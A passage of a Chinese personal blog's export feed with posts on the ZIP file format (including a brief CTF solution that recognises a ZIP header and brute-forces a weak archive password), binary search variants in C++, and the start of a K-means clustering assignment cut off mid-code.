    <content><![CDATA[<p>最近遇到一道CTF题是和zip格式编码相关的，正好我一直以来就对各文件格式编码没有一个系统的认知，就趁这个机会好好学习一下。</p>
<span id="more"></span>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>ZIP文件格式是一种数据压缩和文档储存的文件格式，原名Deflate，发明者为菲尔·卡茨（Phil Katz），他于1989年1月公布了该格式的资料。ZIP通常使用后缀名“.zip”，它的MIME格式为application/zip。当前，ZIP格式属于几种主流的压缩格式之一，其竞争者包括RAR格式以及开放源码的7z格式。从性能上比较，RAR及7z格式较ZIP格式压缩率较高，而7-Zip由于提供了免费的压缩工具而逐渐在更多的领域得到应用。Microsoft从Windows ME操作系统开始内置对zip格式的支持，即使用户的计算机上没有安装解压缩软件，也能打开和制作zip格式的压缩文件，OS X和流行的Linux操作系统也对zip格式提供了类似的支持。因此如果在网络上传播和分发文件，zip格式往往是最常用的选择。</p>
</blockquote>
<h1 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h1><p>如果想要准确系统的了解整个zip格式，最好还是查看官方文档，链接如下：</p>
<p><a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">.ZIP File Format Specification</a></p>
<h1 id="格式分析"><a href="#格式分析" class="headerlink" title="格式分析"></a>格式分析</h1><p>根据官方文档，我们可以得知，一个标准的zip格式文件由以下结构组成：</p>
<pre class="language-none"><code class="language-none">[local file header 1]
[file data 1]
[data descriptor 1]
. 
.
.
[local file header n]
[file data n]
[data descriptor n]
[archive decryption header] (EFS)
[archive extra data record] (EFS)
[central directory]
[zip64 end of central directory record]
[zip64 end of central directory locator] 
[end of central directory record]</code></pre>

<p>在这里我们只考虑 <code>local file header</code> + <code>file data</code> + <code>data descriptor</code> + <code>central directory</code> + <code>end of central directory record</code>.</p>
<h2 id="文件头-Local-file-header"><a href="#文件头-Local-file-header" class="headerlink" title="文件头(Local file header)"></a>文件头(Local file header)</h2><pre class="language-none"><code class="language-none">local file header signature     4 bytes  (0x04034b50)
version needed to extract       2 bytes
general purpose bit flag        2 bytes
compression method              2 bytes
last mod file time              2 bytes
last mod file date              2 bytes
crc-32                          4 bytes
compressed size                 4 bytes
uncompressed size               4 bytes
file name length                2 bytes
extra field length              2 bytes

file name (variable size)
extra field (variable size)</code></pre>

<p>为了演示的方便，以下我们以一个包含了文本内容为26个英文字母的文本文件的压缩包做对照分析。</p>
<p><img src="/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/010.png"></p>
<ol>
<li>文件头位置即为灰色区域，首先是本地文件头标识位(local file header signature)，值为固定的0x04034b50（需要注意的是单个字节数据在内存中的存储是低位在前，高位在后）。</li>
<li>解压文件所需pkware的最低版本(version needed to extract)：0x000a，一般不需要考虑。</li>
<li>通用比特标志位(general purpose bit flag)：0x0000，通常只需要考虑当bit 0为1时表示文件被加密。</li>
<li>压缩方式(compression method)：0x0000，当值为：0x0000时表示无压缩。</li>
<li>文件最后修改时间(last mod file time)：0x4e5a，以standard MS-DOS格式编码。 </li>
<li>文件最后修改日期(last mod file date)：0x531d，同上。</li>
<li>CRC32校验码(crc-32)：0x4c2750bd.</li>
<li>压缩后大小(compressed size)：0x0000001a，单位为byte，由此我们可以推断出标准ZIP格式最大压缩容量为：16^8 - 1 bytes ≈ 4 GB，而ZIP64格式最大压缩容量为 2^64 - 1 bytes ≈ 16EB。</li>
<li>未压缩的大小(uncompressed size)：0x0000001a，可见该文件并没有被压缩，这也与压缩方式为0x0000相吻合。</li>
<li>文件名长度(file name length)：0x0008.</li>
<li>扩展区长度(extra field length)：0x0000.</li>
<li>文件名(file name)：0x7478742e74736574.</li>
<li>扩展区(extra field)：无</li>
</ol>
<h2 id="文件数据-File-data"><a href="#文件数据-File-data" class="headerlink" title="文件数据(File data)"></a>文件数据(File data)</h2><p>存储被压缩文件的数据：本例中即为26个英文字母，图中的黑色区域。</p>
<h2 id="数据描述符-Data-descriptor"><a href="#数据描述符-Data-descriptor" class="headerlink" title="数据描述符(Data descriptor)"></a>数据描述符(Data descriptor)</h2><pre class="language-none"><code class="language-none">crc-32                          4 bytes
      compressed size                 4 bytes
      uncompressed size               4 bytes</code></pre>

<p>该区域只有在文件头的通用比特标志位的第3位(0x0008)为1时才存在，紧跟在压缩文件的数据区之后，只用在不能对输出的 ZIP 文件进行检索时使用。</p>
<h2 id="核心目录-Central-directory"><a href="#核心目录-Central-directory" class="headerlink" title="核心目录(Central directory)"></a>核心目录(Central directory)</h2><pre class="language-none"><code class="language-none">[file header 1]
.
.
. 
[file header n]
[digital signature] </code></pre>

<h3 id="文件头-File-header"><a href="#文件头-File-header" class="headerlink" title="文件头(File header)"></a>文件头(File header)</h3><pre class="language-none"><code class="language-none">central file header signature   4 bytes  (0x02014b50)
      version made by                 2 bytes
      version needed to extract       2 bytes
      general purpose bit flag        2 bytes
      compression method              2 bytes
      last mod file time              2 bytes
      last mod file date              2 bytes
      crc-32                          4 bytes
      compressed size                 4 bytes
      uncompressed size               4 bytes
      file name length                2 bytes
      extra field length              2 bytes
      file comment length             2 bytes
      disk number start               2 bytes
      internal file attributes        2 bytes
      external file attributes        4 bytes
      relative offset of local header 4 bytes

      file name (variable size)
      extra field (variable size)
      file comment (variable size)</code></pre>

<ol>
<li>核心文件头标识位(central file header signature)：0x02014b50，为固定数值。</li>
<li>压缩所用pkware版本(version mad by)：0x003f.</li>
<li>解压所需的pkware最低版本(version needed to extract)：0x000a.</li>
<li>通用比特标志位(general purpose bit flag)：0x0000.</li>
<li>压缩方式(compression method)：0x0000.</li>
<li>文件最后修改时间(last mod file time)：0x4e5a.</li>
<li>文件最后修改日期(last mod file date)：0x531d.</li>
<li>CRC32校验码(crc-32)：0x4c2750bd.</li>
<li>压缩后大小(compressed size)：0x0000001a.</li>
<li>未压缩的大小(uncompressed size)：0x0000001a.</li>
<li>文件名长度(file name length)：0x0008.</li>
<li>扩展区长度(extra field length)：0x0024.</li>
<li>文件注释长度(file comment length)：0x0000.</li>
<li>文件开始位置的磁盘编号(disk number start)：0x0000.</li>
<li>内部文件属性(internal file attributes)：0x0000.</li>
<li>外部文件属性(external file attributes)：0x00000002，外部属性的映射取决于主机系统，对于MS-DOS，低位字节是MS-DOS目录属性字节，如果输入来自于标准输入，该区域置为零。</li>
<li>本地文件头的相互偏移(relative offset of local header)：0x00000000.</li>
<li>文件名(file name)：0x7478742e74736574.</li>
<li>扩展区(extra field)：即文件名后的36个字节数据。</li>
<li>文件注释(file comment)：无</li>
</ol>
<h3 id="数字签名-Digital-signature"><a href="#数字签名-Digital-signature" class="headerlink" title="数字签名(Digital signature)"></a>数字签名(Digital signature)</h3><pre class="language-none"><code class="language-none">header signature                4 bytes  (0x05054b50)
      size of data                    2 bytes
      signature data (variable size)</code></pre>

<p>本区域不是必须的，在此不多赘述，感兴趣可以查看官方文档。</p>
<h2 id="目录结束标识-End-of-central-directory-record"><a href="#目录结束标识-End-of-central-directory-record" class="headerlink" title="目录结束标识(End of central directory record)"></a>目录结束标识(End of central directory record)</h2><pre class="language-none"><code class="language-none">end of central dir signature    4 bytes  (0x06054b50)
      number of this disk             2 bytes
      number of the disk with the
      start of the central directory  2 bytes
      total number of entries in the
      central directory on this disk  2 bytes
      total number of entries in
      the central directory           2 bytes
      size of the central directory   4 bytes
      offset of start of central
      directory with respect to
      the starting disk number        4 bytes
      .ZIP file comment length        2 bytes
      .ZIP file comment       (variable size)</code></pre>

<ol>
<li>核心目录结束标识位(end of central dir signature)：0x06054b50，为固定数值。</li>
<li>该磁盘编号(number of this disk)：0x0000.</li>
<li>核心目录开始位置的磁盘编号(number of the disk with the start of the central directory)：0x0000.</li>
<li>该磁盘所记录的核心目录总数(total number of entries in the central directory on this disk)：0x0001.</li>
<li>核心目录结构总数(total number of entries in the central directory on this disk)：0x0001.</li>
<li>核心目录大小(size of the central directory)：0x0000005a.</li>
<li>核心目录开始位置相较于起始磁盘号的偏移量(offset of start of central directory with respect to the starting disk number)：0x00000040.</li>
<li>ZIP文件注释长度(.ZIP file comment length)：0x0000.</li>
<li>ZIP文件注释(.ZIP file comment)：无</li>
</ol>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=1&id=4930&page=1">你猜猜</a></p>
<h2 id="分析与解答"><a href="#分析与解答" class="headerlink" title="分析与解答"></a>分析与解答</h2><p>由于对ZIP格式编码不熟悉，刚看到这一串字符以为是某种加密方式，在学习过本文后在看，很明显<strong>504B0304</strong>为ZIP格式的文件头标识位，因此我们打开010Editor，导入这一串16进制编码，并保存为ZIP格式。解压时发现设置了密码，考虑密码应该不会太复杂，直接暴力破解得到结果。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息安全</tag>
        <tag>文件</tag>
        <tag>编码格式</tag>
      </tags>
  </entry>
  <entry>
    <title>二分搜索的几种写法与常见问题</title>
    <url>/2023/09/17/%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>最近在比赛和刷题的时候经常遇到二分答案的题，但时不时会因为一些细节上的错误而浪费时间，本文旨在整理常见的二分搜索的写法、二分搜索可能会遇到的一些小问题，以及 <em>C++</em> 中与二分搜索相关的库函数，以免今后再犯类似的错误。</p>
<span id="more"></span>

<h1 id="二分搜索的写法"><a href="#二分搜索的写法" class="headerlink" title="二分搜索的写法"></a>二分搜索的写法</h1><h2 id="查找某个值的下标"><a href="#查找某个值的下标" class="headerlink" title="查找某个值的下标"></a>查找某个值的下标</h2><p>定义函数 <code>binarySearch(nums, target)</code> 为搜索有序数组 <em>nums</em> 中是否存在 <em>i</em> 使得 <code>nums[i] == target</code>，如果是，返回 <em>i</em>，否则返回 <em>-1</em>.</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> mid<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>这应该是大部分人最早接触的二分形式，也是最简单、最好理解的二分写法，但如果 <em>nums</em> 中元素存在重复的情况，并且我们需要在 <em>nums</em> 中存在多个 <em>i</em> 使得 <code>nums[i] == target</code> 时返回最小的 <em>i</em>，这种写法就失效了，而这种情况往往就是解决大部分有关二分搜索的算法问题时会遇到的。</p>
<h2 id="查找左边界"><a href="#查找左边界" class="headerlink" title="查找左边界"></a>查找左边界</h2><p>要想成功实现对边界的查找，就需要对二分搜索的过程有一个更为深入的理解。还是采用与上面类似的写法，初始时将区间左右边界初始化为 <code>low = 0, high = n - 1;</code>. 在定义左右边界时我们应该注意到，待搜索的区间范围为 <em>low</em> 和 <em>high</em>，但是由于 <em>low</em> 和 <em>high</em> 本身就有可能为所要查找的最终结果 <em>i</em>，因此搜索目标位于<strong>闭区间</strong> [<em>low</em>, <em>high</em>] 内，实际上区间内的数据分布情况我们是不得而知的，而我们已经获取的信息其实是区间外的信息，即：</p>
<ul>
<li>当 <code>i &lt;= low - 1</code> 时，<code>nums[i] &lt; target</code>.</li>
<li>当 <code>i &gt;= high + 1</code> 时，<code>nums[i] &gt;= target</code>.</li>
</ul>
<p>以上信息即为二分搜索过程中的<strong>循环不变量</strong>。需要注意的是，当 <em>low</em> 和 <em>high</em> 本身就位于左右边界的情况下， <em>low - 1</em> 和 <em>high + 1</em> 已经超出数组范围，但由于 <em>nums</em> 是一个有序数组，因此我们可以这样考虑：<code>nums[-1] = -∞, nums[n] = +∞</code>. 因此上述的循环不变量在二分搜索开始时也满足。而要使得循环不变量在整个二分搜索过程中均满足，就需要在得到区间中点 <em>mid</em> 后，严格按照上述规则来更新区间左右端点：</p>
<ul>
<li>当 <code>nums[mid] &gt;= target</code> 时，要使得 <code>nums[high + 1] &gt;= target</code>，那么可令 <code>high + 1 = mid</code>，等价于 <code>high = mid - 1</code>.</li>
<li>当 <code>nums[mid] &lt; target</code> 时，要使得 <code>nums[low - 1] &lt; target</code>，令 <code>low - 1 = mid</code>，等价于 <code>low = mid + 1</code>.</li>
</ul>
<p>最终，循环条件为该闭区间不为空，表示仍然存在未确定的区间外信息，即  <code>low &lt;= high</code>（取等号是因为当 <code>low == high</code> 时，闭区间内仍然有一个元素，应该继续循环），当退出循环时满足 <code>low == high + 1</code>，此时根据上述的循环不变量可知，<code>nums[low - 1] == nums[high] &lt; target</code>，<code>nums[high + 1] == nums[low] &gt;= target</code>，即 <code>nums[low]</code> 为有序数组 <em>nums</em> 中第一个大于等于 <em>target</em> 的值。</p>
<p>依据以上区间边界初始化方法、边界更新方法以及最终的返回值，可以很容易地编写相应代码。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 闭区间型</span>
<span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> low<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>当然，除了以上“闭区间型”写法外，还有“左闭右开型“和开区间型，这些写法的本质思想是完全一样的，只不过是选取的循环不变量不同。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 左闭右开型</span>
<span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 左闭右开区间当 low == high 时就已为空</span>
		<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
		<span class="token comment">// 循环不变量</span>
		<span class="token comment">// nums[high] >= target</span>
		<span class="token comment">// nums[low - 1] &lt; target</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			high <span class="token operator">=</span> mid<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> low<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 开区间型</span>
<span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 开区间当 low + 1 == high 时就已为空</span>
		<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
		<span class="token comment">// 循环不变量</span>
		<span class="token comment">// nums[high] >= target</span>
		<span class="token comment">// nums[low] &lt; target</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			high <span class="token operator">=</span> mid<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			low <span class="token operator">=</span> mid<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> high<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="查找右边界"><a href="#查找右边界" class="headerlink" title="查找右边界"></a>查找右边界</h2><p>要对右边界进行查找，同样可以通过改写循环不变量来实现。不过通常对于元素类型为整型的有序数组来说，对右边界的查找可以转化为对左边界的查找。</p>
<p>比如要查找整型有序数组 nums 中最小的 <em>i</em> 满足 <code>nums[i] &gt; target</code>，记为 <code>upper_bound(nums, target)</code>，由于对于整型来说，<code>nums[i] &gt; target</code> 与 <code>nums[i] &gt;= target + 1</code> 等价，因此可以直接查找最小的 <em>i</em> 满足 <code>nums[i] &gt;= target + 1</code> ，得到的 <em>i</em> 即为最小的 <em>i</em> 满足 <code>nums[i] &gt; target</code>，即 <code>upper_bound(nums, target) = lower_bound(nums, target + 1)</code>.</p>
<p>同样的，诸如 <code>nums[i] &lt; target</code>、<code>nums[i] &lt;= target</code> 等等问题都可以通过类似的思想进行等价，这里就不过多赘述。</p>
<h1 id="常见的问题"><a href="#常见的问题" class="headerlink" title="常见的问题"></a>常见的问题</h1><p>在采用二分答案法解决一些最优化问题时，上下界的确定往往是比较困难和繁琐的。但由于进行一次二分搜索的时间复杂度为 <em>O(logn)<em>，</em>n</em> 的大小对最终时间的影响不会很大，因此实际面对这些问题时，往往直接令下界为 <code>low = 0, high = INT32_MAX</code>，但是这样又很容易出现<strong>整型溢出</strong>的问题，尤其是采用 <code>mid = (low + high) / 2</code> 这种写法的情况下，虽然 <em>low</em> 和 <em>high</em> 的值均位于 [<em>0, INT32_MAX</em>] 之间，但 <em>low + high</em> 却可能大于 <em>INT32_MAX</em>，从而导致一些意料不到的错误出现。因此求区间中值比较好的写法是 <code>mid = low + (high - low) / 2</code>，其在数学上与上述计算方式等价，但却可以很好地规避掉整型溢出的问题。</p>
<p>此外，有些问题还需要 <em>mid</em> 参与一些运算，来进行该问题的最优化判定，这时一个接近溢出的整数在进行一些加法或乘法运算后很容易因此溢出。因此一个比较安全的做法是将区间上下界以及区间中值都定义为 <em>64</em> 位整型（<em>C++</em> 中为 <em>long long</em> 类型）。</p>
<h1 id="相关库函数"><a href="#相关库函数" class="headerlink" title="相关库函数"></a>相关库函数</h1><ul>
<li><code>lower_bound(first, last, value, comp);</code></li>
</ul>
<p><em>first, last</em> 为搜索数组的左闭右开区间，通常直接取 <code>first = nums.begin(), last = nums.end()</code> ，<em>value</em> 为要与元素比较的值，<em>comp</em> 为<strong>谓词函数</strong>，与排序等算法的谓词函数类似，即第一参数先序于第二参数时，返回 <em>true</em>，否则返回 <em>false</em>.</p>
<p>该函数的返回值为指向范围 <em>first</em> 和 <em>last</em> 之间的首个不满足元素值 <code>element &lt; value</code> 或者 <code>comp(element, value)</code> 的元素的迭代器，如果找不到，则返回 <em>last</em>.</p>
<ul>
<li><code>upper_bound(first, last, value, comp);</code></li>
</ul>
<p>参数与 <em>lower_bound</em> 相同，而返回值为指向范围 <em>first</em> 和 <em>last</em> 之间的首个满足元素值 <code>element &gt; value</code> 或者 <code>comp(value, element)</code> 的元素的迭代器，如果找不到，则返回 <em>last</em>.</p>
<p>这里只是简单的介绍了一下两种二分操作的参数及返回值，想要了解具体信息，可参考 <strong>cppreference</strong>.</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.bilibili.com/video/BV1AP41137w7/?vd_source=8cf6c757d07cf014cd9ca13a60132b66">二分查找 红蓝染色法【基础算法精讲】 - 哔哩哔哩</a></p>
<p><a href="https://www.zhihu.com/question/36132386">二分查找有几种写法？它们的区别是什么？ - 知乎</a></p>
<p><a href="https://blog.csdn.net/groovy2007/article/details/78309120">二分查找中的循环不变式_二分搜索的循环不变式 - groovy2007的博客</a></p>
<p><a href="https://zh.cppreference.com/w/cpp/algorithm/lower_bound">std::lower_bound - cppreference.com</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>人工智能作业 使用K-means算法进行聚类分析</title>
    <url>/2022/04/27/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8K-means%E7%AE%97%E6%B3%95%E8%BF%9B%E8%A1%8C%E8%81%9A%E7%B1%BB%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>本文将介绍如何使用 K-means 算法对给定的坐标数据进行聚类分析。</p>
<span id="more"></span>

<h1 id="使用K-means算法进行聚类分析"><a href="#使用K-means算法进行聚类分析" class="headerlink" title="使用K-means算法进行聚类分析"></a>使用K-means算法进行聚类分析</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><blockquote>
<p>K-means算法对data中数据进行聚类分析</p>
<p>（1）算法原理描述</p>
<p>（2）算法结构</p>
<p>（3）写出K-means具体功能函数（不能直接调用sklearn.cluster(Means)功能函数)具体函数功能中返回值包括 数据类标签，累中心，输入包括：数据，类别数</p>
<p>（4）可视化画图，不同类数据采用不同颜色</p>
<p>（5）算法分析</p>
<p>  类类方差，平均方差，不同初始点对聚类结果的影响？</p>
<p>  如何解决？</p>
</blockquote>
<h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><ol>
<li><p><strong>数据结构设计</strong>：   数据点使用自定义数据类型point，包含x和y两个变量。  中心点一个大小为k的数组center进行存储，从文本中提取的坐标数据使用可变数组coords进行存储，不同的坐标点分组采用一个可变的二维数组group进行存储。  </p>
</li>
<li><p><strong>函数介绍：</strong> </p>
<p>extraCoords(): 从文本文件中提取坐标数据并存入coords中，提取算法为：首先使用传入文件路径初始化文件IO流fileStream，再逐个输出fileStream中的数据。若为字母，则不接收。否则两个一组接收，并使用stod()函数接收到的字符串转换成double类型并存入coords中。  </p>
<p>drawFigures()：用于将传入坐标数组的数据绘制在屏幕上，由于该函数代码逻辑较为简单且程序段较短，因此设置为内联函数以减少函数调用开销。  </p>
<p>clusterAnalysis()：核心算法程序，即Kmeans算法的原理： </p>
<ol>
<li><p>首先输入分组k 的值，即通过指定分组数目得到 k 个分组； </p>
</li>
<li><p>从数据集中随机选取 k 个数据点作为初始中心；  </p>
</li>
<li><p>对集合中每一数据点，计算与每一个中心点的距离，离哪个中心点距离近，就加入中心点对应的组。  </p>
</li>
<li><p>对k个组计算距离的平均值  </p>
</li>
<li><p>如果两次求得的均值距离的平均值小于某一个设置的阈值，可以认为我们进行的聚类已经达到期望的结果，算法终止。  </p>
</li>
<li><p>如果两次求得的均值距离大于某一个设置的阈值，继续迭代，如果迭代次数大于设定的值，那么终止。  </p>
</li>
</ol>
</li>
<li><p><strong>程序运行说明：</strong>本程序绘图功能借助了第三方库easyX，如需运行请先前往安装：<a href="https://easyx.cn/">https://easyx.cn/</a>  程序运行前将数据文件放置于源程序根目录下，并更名为data.txt.  </p>
</li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;graphics.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fstream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Kmeans</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	<span class="token keyword">struct</span> <span class="token class-name">point</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">double</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>
		<span class="token function">point</span><span class="token punctuation">(</span><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">double</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">x</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">y</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span> iterLimit <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
